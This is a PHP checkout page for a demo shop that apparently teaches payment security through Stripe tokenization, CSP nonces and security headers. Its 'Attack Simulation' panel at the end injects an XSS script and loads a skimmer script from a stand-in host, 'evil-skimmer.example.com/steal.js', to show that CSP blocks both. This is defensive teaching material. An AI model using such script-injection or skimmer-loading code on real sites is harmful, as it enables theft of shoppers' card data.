<?php
session_start();
require_once __DIR__ . '/../config/config.php';
require_once __DIR__ . '/../config/products.php';
require_once __DIR__ . '/../src/SecurityHeaders.php';
require_once __DIR__ . '/../src/NonceGenerator.php';

use function Vault\getCart;
use function Vault\cartSubtotal;
use function Vault\getProduct;
use Vault\NonceGenerator;
use Vault\SecurityHeaders;

$cart = getCart();
if (empty($cart)) {
  header('Location: shop.php');
  exit;
}

$subtotal = cartSubtotal();
$tax = round($subtotal * 0.20, 2);
$total = $subtotal + $tax;
$totalCents = (int) round($total * 100);

$nonce = NonceGenerator::generate();
SecurityHeaders::apply($nonce);
$stripe_pk = STRIPE_PUBLIC_KEY;
$nonceHtml = htmlspecialchars($nonce, ENT_QUOTES, 'UTF-8');
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Checkout — VauLT</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" nonce="<?= $nonceHtml ?>">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"
    nonce="<?= $nonceHtml ?>">
  <link rel="stylesheet" href="style.css" nonce="<?= $nonceHtml ?>">
  <style nonce="<?= $nonceHtml ?>">
    .checkout-layout {
      display: grid;
      grid-template-columns: 1fr 340px;
      gap: 40px;
      padding: 32px 0 60px;
      align-items: start
    }

    .form-section {
      margin-bottom: 32px
    }

    .form-section-title {
      font-size: 13px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: .06em;
      border-bottom: 2px solid var(--black);
      padding-bottom: 8px;
      margin-bottom: 20px
    }

    .form-section-title span {
      display: inline-block;
      background: var(--yellow);
      width: 22px;
      height: 22px;
      font-size: 12px;
      text-align: center;
      line-height: 22px;
      font-weight: 700;
      margin-right: 8px
    }

    .submit-btn {
      width: 100%;
      padding: 14px;
      background: var(--yellow);
      color: var(--black);
      border: none;
      font-family: var(--font);
      font-size: 14px;
      font-weight: 700;
      cursor: pointer;
      text-transform: uppercase;
      letter-spacing: .04em;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px
    }

    .submit-btn:hover:not(:disabled) {
      background: #e6b800
    }

    .submit-btn:disabled {
      opacity: .5;
      cursor: not-allowed
    }

    .submit-btn .btn-loading {
      display: none;
      align-items: center;
      gap: 8px
    }

    .submit-btn .btn-text {
      display: flex;
      align-items: center;
      gap: 8px
    }

    .submit-btn.loading .btn-text {
      display: none
    }

    .submit-btn.loading .btn-loading {
      display: flex
    }

    .spinner {
      width: 14px;
      height: 14px;
      border: 2px solid rgba(0, 0, 0, .2);
      border-top-color: var(--black);
      border-radius: 50%;
      animation: spin .7s linear infinite
    }

    @keyframes spin {
      to {
        transform: rotate(360deg)
      }
    }

    .summary-box {
      border: 1px solid var(--gray-200);
      position: sticky;
      top: 20px
    }

    .summary-box-header {
      background: var(--black);
      color: var(--white);
      padding: 12px 20px;
      font-size: 13px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: .06em
    }

    .summary-box-body {
      padding: 20px
    }

    .summary-item {
      display: flex;
      align-items: center;
      gap: 10px;
      padding: 8px 0;
      border-bottom: 1px solid var(--gray-200)
    }

    .summary-item:last-child {
      border-bottom: none
    }

    .summary-item-qty {
      position: absolute;
      top: -5px;
      right: -5px;
      background: var(--black);
      color: var(--white);
      font-size: 9px;
      font-weight: 700;
      width: 16px;
      height: 16px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center
    }

    .summary-item-name {
      flex: 1;
      font-size: 13px;
      font-weight: 500;
      line-height: 1.3
    }

    .summary-item-price {
      font-size: 13px;
      font-weight: 600
    }

    .summary-line {
      display: flex;
      justify-content: space-between;
      font-size: 13px;
      margin-bottom: 8px;
      color: var(--gray-600)
    }

    .summary-line strong {
      color: var(--black)
    }

    .summary-total {
      display: flex;
      justify-content: space-between;
      align-items: baseline;
      padding-top: 12px;
      border-top: 2px solid var(--black);
      margin-top: 12px
    }

    .summary-total-label {
      font-size: 14px;
      font-weight: 700
    }

    .summary-total-value {
      font-size: 22px;
      font-weight: 700
    }

    .success-view {
      display: none;
      padding: 32px 0;
      text-align: center
    }

    .success-view.visible {
      display: block
    }

    .success-check {
      width: 56px;
      height: 56px;
      background: var(--yellow);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      margin: 0 auto 20px
    }

    .success-view h2 {
      font-size: 22px;
      font-weight: 700;
      margin-bottom: 8px
    }

    .success-view p {
      font-size: 13px;
      color: var(--gray-600);
      margin-bottom: 20px
    }

    .token-box {
      background: var(--gray-100);
      border-left: 3px solid var(--yellow);
      padding: 12px 16px;
      text-align: left;
      margin-bottom: 12px
    }

    .token-box-label {
      font-size: 11px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: .06em;
      color: var(--gray-600);
      margin-bottom: 4px
    }

    .token-box-value {
      font-size: 13px;
      font-weight: 600;
      word-break: break-all;
      font-family: monospace
    }

    .diag-panel {
      margin-top: 32px;
      border: 1px solid var(--gray-200)
    }

    .diag-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 16px;
      background: var(--gray-100);
      border-bottom: 1px solid var(--gray-200);
      cursor: pointer;
      user-select: none
    }

    .diag-header-title {
      font-size: 12px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: .06em
    }

    .diag-toggle {
      font-size: 12px;
      color: var(--gray-600)
    }

    .diag-body {
      display: none;
      padding: 16px
    }

    .diag-body.open {
      display: block
    }

    .diag-row {
      margin-bottom: 16px;
      padding-bottom: 16px;
      border-bottom: 1px solid var(--gray-200)
    }

    .diag-row:last-child {
      border-bottom: none;
      margin-bottom: 0;
      padding-bottom: 0
    }

    .diag-key {
      font-size: 11px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: .06em;
      color: var(--gray-600);
      margin-bottom: 4px
    }

    .diag-value {
      font-family: monospace;
      font-size: 12px;
      background: var(--gray-100);
      padding: 6px 10px;
      border-left: 3px solid var(--yellow);
      word-break: break-all;
      line-height: 1.6
    }

    .diag-desc {
      font-size: 12px;
      color: var(--gray-600);
      margin-top: 4px;
      line-height: 1.5
    }

    .attack-panel {
      margin-top: 12px;
      border: 1px solid #ffcccc
    }

    .attack-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 16px;
      background: #fff5f5;
      border-bottom: 1px solid #ffcccc;
      cursor: pointer;
      user-select: none
    }

    .attack-header-title {
      font-size: 12px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: .06em;
      color: var(--red)
    }

    .attack-body {
      display: none;
      padding: 16px
    }

    .attack-body.open {
      display: block
    }

    .attack-desc {
      font-size: 12px;
      color: var(--gray-600);
      margin-bottom: 12px;
      line-height: 1.5
    }

    .attack-btn {
      display: block;
      width: 100%;
      padding: 9px 14px;
      background: #fff5f5;
      color: var(--red);
      border: 1px solid #ffcccc;
      font-family: var(--font);
      font-size: 12px;
      text-align: left;
      cursor: pointer;
      margin-bottom: 8px
    }

    .attack-btn:hover {
      background: #ffe0e0
    }

    .attack-btn:last-of-type {
      margin-bottom: 0
    }

    .attack-result {
      margin-top: 10px;
      padding: 10px 14px;
      font-size: 12px;
      line-height: 1.5;
      display: none
    }

    .attack-result.blocked {
      display: block;
      background: #f0fff5;
      border-left: 3px solid var(--green);
      color: var(--green)
    }

    @media(max-width:800px) {
      .checkout-layout {
        grid-template-columns: 1fr
      }

      .summary-box {
        position: static
      }
    }
  </style>
</head>

<body>

  <header class="site-header">
    <div class="container">
      <a href="shop.php" class="site-logo">V<span>au</span>LT</a>
      <nav class="site-nav"><a href="shop.php">Shop</a><a href="cart.php">Cart</a></nav>
      <div class="header-right"><span style="font-size:12px;color:rgba(255,255,255,.5);">🔒 Secure Checkout</span></div>
    </div>
  </header>

  <div style="background:var(--gray-100);border-bottom:1px solid var(--gray-200);padding:10px 0;">
    <div class="container" style="display:flex;gap:8px;font-size:12px;color:var(--gray-400);align-items:center;">
      <a href="shop.php" style="color:var(--gray-400)">Shop</a><span>›</span>
      <a href="cart.php" style="color:var(--gray-400)">Cart</a><span>›</span>
      <strong style="color:var(--black)">Checkout</strong>
    </div>
  </div>

  <main>
    <div class="container">
      <div class="checkout-layout">

        <!-- LEFT -->
        <div>
          <div id="payment-form-view">

            <div class="form-section">
              <div class="form-section-title"><span>1</span>Contact</div>
              <div class="form-row">
                <div class="form-group">
                  <label class="form-label" for="first-name">First Name</label>
                  <input class="form-input" type="text" id="first-name" placeholder="Jane" autocomplete="given-name">
                </div>
                <div class="form-group">
                  <label class="form-label" for="last-name">Last Name</label>
                  <input class="form-input" type="text" id="last-name" placeholder="Doe" autocomplete="family-name">
                </div>
              </div>
              <div class="form-group">
                <label class="form-label" for="email">Email</label>
                <input class="form-input" type="email" id="email" placeholder="jane@example.com" autocomplete="email">
              </div>
            </div>

            <div class="form-section">
              <div class="form-section-title"><span>2</span>Billing Address</div>
              <div class="form-group">
                <label class="form-label" for="address">Street Address</label>
                <input class="form-input" type="text" id="address" placeholder="123 Main Street"
                  autocomplete="address-line1">
              </div>
              <div class="form-row">
                <div class="form-group">
                  <label class="form-label" for="city">City</label>
                  <input class="form-input" type="text" id="city" placeholder="London" autocomplete="address-level2">
                </div>
                <div class="form-group">
                  <label class="form-label" for="postal">Postal Code</label>
                  <input class="form-input" type="text" id="postal" placeholder="EC1A 1BB" autocomplete="postal-code">
                </div>
              </div>
              <div class="form-group">
                <label class="form-label" for="country">Country</label>
                <select class="form-input" id="country" autocomplete="country">
                  <option value="">Select country…</option>
                  <option>United Kingdom</option>
                  <option>Poland</option>
                  <option>United States</option>
                  <option>Germany</option>
                  <option>France</option>
                  <option>Canada</option>
                  <option>Australia</option>
                </select>
              </div>
            </div>

            <div class="form-section">
              <div class="form-section-title"><span>3</span>Payment Details</div>
              <p style="font-size:12px;color:var(--gray-600);margin-bottom:16px;line-height:1.5;">
                Card fields are hosted by Stripe in a secure iFrame. Your card number never passes through this server.
              </p>
              <div class="form-group">
                <label class="form-label" for="cardholder-name">Cardholder Name</label>
                <input class="form-input" type="text" id="cardholder-name" placeholder="Jane Doe"
                  autocomplete="cc-name">
              </div>
              <div class="form-group">
                <label class="form-label" for="stripe-card-element">Card Number</label>
                <div id="stripe-card-element" class="stripe-element-wrapper"></div>
              </div>
              <div class="form-row">
                <div class="form-group">
                  <label class="form-label" for="stripe-expiry-element">Expiry</label>
                  <div id="stripe-expiry-element" class="stripe-element-wrapper"></div>
                </div>
                <div class="form-group">
                  <label class="form-label" for="stripe-cvc-element">CVC</label>
                  <div id="stripe-cvc-element" class="stripe-element-wrapper"></div>
                </div>
              </div>
              <div id="card-errors" class="msg-error"></div>
              <hr class="divider">
              <button id="submit-btn" class="submit-btn">
                <span class="btn-text">🔒 Pay $<?= number_format($total, 2) ?></span>
                <span class="btn-loading"><span class="spinner"></span>Processing…</span>
              </button>
              <p style="font-size:11px;color:var(--gray-400);margin-top:10px;line-height:1.6;">
                Payments processed by Stripe (PCI DSS Level 1). Your card number never reaches this server.
              </p>
            </div>

          </div><!-- #payment-form-view -->

          <div id="success-view" class="success-view">
            <div class="success-check">✓</div>
            <h2>Payment Confirmed</h2>
            <p>Your order has been placed successfully.</p>
            <div class="token-box">
              <div class="token-box-label">Cryptographic Token (received by server)</div>
              <div class="token-box-value" id="token-display-value">—</div>
            </div>
            <div class="token-box" style="border-left-color:var(--black)">
              <div class="token-box-label">PAN transmitted to merchant server?</div>
              <div class="token-box-value">No — PAN stayed in Stripe's Vault</div>
            </div>
            <a href="shop.php" class="btn btn-primary" style="margin-top:12px;display:inline-flex;">← Back to Shop</a>
          </div>

          <!-- DIAGNOSTICS -->
          <div class="diag-panel">
            <button class="diag-header" id="diag-header-btn">
              <span class="diag-header-title">🔬 Security Diagnostics</span>
              <span class="diag-toggle" id="diag-toggle">[ show ]</span>
            </button>
            <div class="diag-body" id="diag-body">
              <div class="diag-row">
                <div class="diag-key">CSP Nonce — this request</div>
                <div class="diag-value"><?= $nonceHtml ?></div>
                <div class="diag-desc">Generated by <code>random_bytes(16)</code> → Base64. Unique per HTTP request.
                  Injected into the CSP header and every &lt;script nonce=""&gt; tag.</div>
              </div>
              <div class="diag-row">
                <div class="diag-key">Active CSP Header</div>
                <div class="diag-value">default-src 'none';<br>script-src 'nonce-<?= $nonceHtml ?>'
                  https://js.stripe.com;<br>frame-src https://js.stripe.com;<br>connect-src 'self'
                  https://api.stripe.com;<br>frame-ancestors 'none';<br>style-src 'nonce-<?= $nonceHtml ?>'
                  https://fonts.googleapis.com;</div>
                <div class="diag-desc">Strict allowlist. Any script without a matching nonce is blocked — including
                  injected XSS and Magecart skimmers.</div>
              </div>
              <div class="diag-row">
                <div class="diag-key">Security Headers</div>
                <div class="diag-value">X-Frame-Options: DENY<br>X-Content-Type-Options: nosniff<br>Referrer-Policy:
                  strict-origin<br>Permissions-Policy: payment=(self)</div>
                <div class="diag-desc">Anti-clickjacking, MIME sniffing protection, referrer control — applied via
                  SecurityHeaders::apply().</div>
              </div>
              <div class="diag-row">
                <div class="diag-key">PCI DSS Scope</div>
                <div class="diag-value">✓ Reduced — PAN bypasses merchant server via Stripe iFrame</div>
                <div class="diag-desc">Stripe Elements injects an iFrame from js.stripe.com. Card data goes directly to
                  Stripe's vault. charge.php receives only a surrogate token (tok_…).</div>
              </div>
            </div>
          </div>

          <!-- ATTACK PANEL -->
          <div class="attack-panel">
            <button class="attack-header" id="attack-header-btn">
              <span class="attack-header-title">⚡ Attack Simulation</span>
              <span class="diag-toggle" id="attack-toggle">[ show ]</span>
            </button>
            <div class="attack-body" id="attack-body">
              <p class="attack-desc">Simulate the attacks from Chapter 1. Each is blocked by the active security
                architecture. Open DevTools → Console to see CSP violation reports.</p>
              <button class="attack-btn" id="simulate-xss-btn">⚡ XSS — Inject
                &lt;script&gt;alert('steal_data')&lt;/script&gt;</button>
              <button class="attack-btn" id="simulate-magecart-btn">⚡ Magecart — Load script from
                evil-skimmer.example.com</button>
              <button class="attack-btn" id="simulate-clickjacking-btn">⚡ Clickjacking — Check X-Frame-Options
                header</button>
              <div id="attack-result" class="attack-result"></div>
            </div>
          </div>
        </div><!-- left -->

        <!-- RIGHT: ORDER SUMMARY -->
        <div>
          <div class="summary-box">
            <div class="summary-box-header">Order Summary</div>
            <div class="summary-box-body">
              <div style="margin-bottom:16px">
                <?php foreach ($cart as $id => $qty):
                  $p = getProduct($id);
                  if (!$p) {
                    continue;
                  } ?>
                  <div class="summary-item">
                    <div class="summary-item-name"><?= htmlspecialchars($p['name']) ?> <span
                        class="summary-item-qty">×<?= $qty ?></span></div>
                    <div class="summary-item-price">$<?= number_format($p['price'] * $qty, 2) ?></div>
                  </div>
                <?php endforeach; ?>
              </div>
              <div class="summary-line"><span>Subtotal</span><strong>$<?= number_format($subtotal, 2) ?></strong></div>
              <div class="summary-line"><span>Shipping</span><strong>Free</strong></div>
              <div class="summary-line"><span>VAT (20%)</span><strong>$<?= number_format($tax, 2) ?></strong></div>
              <div class="summary-total">
                <span class="summary-total-label">Total</span>
                <span class="summary-total-value">$<?= number_format($total, 2) ?></span>
              </div>
              <div
                style="margin-top:16px;padding:10px 14px;background:var(--gray-100);border-left:3px solid var(--yellow);font-size:11px;color:var(--gray-600);line-height:1.6;">
                🔑 Vault tokenization · CSP nonces · SRI hashes<br>Card number never reaches this server.
              </div>
            </div>
          </div>
        </div>

      </div>
    </div>
  </main>

  <footer class="site-footer">
    <strong>VauLT</strong> Premium Store
  </footer>

  <script src="https://js.stripe.com/v3/" nonce="<?= $nonceHtml ?>"></script>

  <script nonce="<?= $nonceHtml ?>">
    (function () {
      'use strict';
      const STRIPE_PK = '<?= htmlspecialchars($stripe_pk, ENT_QUOTES, 'UTF-8') ?>';
      const TOTAL_CENTS = <?= $totalCents ?>;

      const stripe = Stripe(STRIPE_PK);
      const elements = stripe.elements({
        appearance: {
          theme: 'flat',
          variables: { colorPrimary: '#111', colorBackground: '#fff', colorText: '#111', colorDanger: '#cc0000', fontFamily: 'Inter,system-ui,sans-serif', fontSizeBase: '14px', borderRadius: '0px', focusBoxShadow: 'none' },
          rules: { '.Input': { border: '1px solid #e8e8e8', padding: '10px 12px', boxShadow: 'none' }, '.Input:focus': { border: '1px solid #111111', boxShadow: 'none' } }
        }
      });

      const cardNumberEl = elements.create('cardNumber', { showIcon: true });
      const cardExpiryEl = elements.create('cardExpiry');
      const cardCvcEl = elements.create('cardCvc');
      cardNumberEl.mount('#stripe-card-element');
      cardExpiryEl.mount('#stripe-expiry-element');
      cardCvcEl.mount('#stripe-cvc-element');
      cardNumberEl.on('change', ({ error }) => showError(error ? error.message : ''));
      document.getElementById('diag-header-btn').addEventListener('click', () => {
        togglePanel('diag-body', 'diag-toggle');
      });
      document.getElementById('attack-header-btn').addEventListener('click', () => {
        togglePanel('attack-body', 'attack-toggle');
      });
      document.getElementById('simulate-xss-btn').addEventListener('click', simulateXSS);
      document.getElementById('simulate-magecart-btn').addEventListener('click', simulateMagecart);
      document.getElementById('simulate-clickjacking-btn').addEventListener('click', simulateClickjacking);

      document.getElementById('submit-btn').addEventListener('click', async () => {
        const name = document.getElementById('cardholder-name').value.trim();
        const req = ['first-name', 'last-name', 'email', 'address', 'city', 'postal', 'country', 'cardholder-name'];
        let ok = true;
        req.forEach(id => {
          const el = document.getElementById(id);
          if (!el.value.trim()) { el.classList.add('error'); ok = false; }
          else el.classList.remove('error');
        });
        if (!ok) { showError('Please fill in all required fields.'); return; }
        setLoading(true); clearError();
        try {
          const { token, error } = await stripe.createToken(cardNumberEl, { name });
          if (error) { showError(error.message); setLoading(false); return; }
          const res = await fetch('charge.php', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: token.id, amount: TOTAL_CENTS, currency: 'usd' }) });
          const result = await res.json();
          if (result.success) { showSuccess(token.id); fetch('clear_cart.php').catch(() => { }); }
          else { showError(result.error || 'Payment failed.'); setLoading(false); }
        } catch (e) { showError('Network error. Please try again.'); setLoading(false); }
      });

      function setLoading(on) { const b = document.getElementById('submit-btn'); b.disabled = on; b.classList.toggle('loading', on); }
      function showError(m) { const e = document.getElementById('card-errors'); e.textContent = m; e.classList.toggle('visible', !!m); }
      function clearError() { showError(''); }
      function showSuccess(id) { document.getElementById('payment-form-view').style.display = 'none'; document.getElementById('success-view').classList.add('visible'); document.getElementById('token-display-value').textContent = id; }
    })();

    function simulateXSS() { const e = document.getElementById('attack-result'), s = document.createElement('script'); s.textContent = "alert('XSS')"; document.body.appendChild(s); e.className = 'attack-result blocked'; e.textContent = '✓ BLOCKED — Script injected into DOM but CSP refused execution (no valid nonce). Check DevTools → Console.'; }
    function simulateMagecart() { const e = document.getElementById('attack-result'), s = document.createElement('script'); s.src = 'https://evil-skimmer.example.com/steal.js'; document.body.appendChild(s); e.className = 'attack-result blocked'; e.textContent = '✓ BLOCKED — evil-skimmer.example.com blocked by CSP script-src allowlist.'; }
    function simulateClickjacking() { const e = document.getElementById('attack-result'); e.className = 'attack-result blocked'; e.textContent = '✓ PROTECTED — X-Frame-Options: DENY and CSP frame-ancestors: none active. Verify in DevTools → Network → Response Headers.'; }
    function togglePanel(b, t) { const bd = document.getElementById(b), tg = document.getElementById(t), o = bd.classList.toggle('open'); tg.textContent = o ? '[ hide ]' : '[ show ]'; }
  </script>

</body>

</html>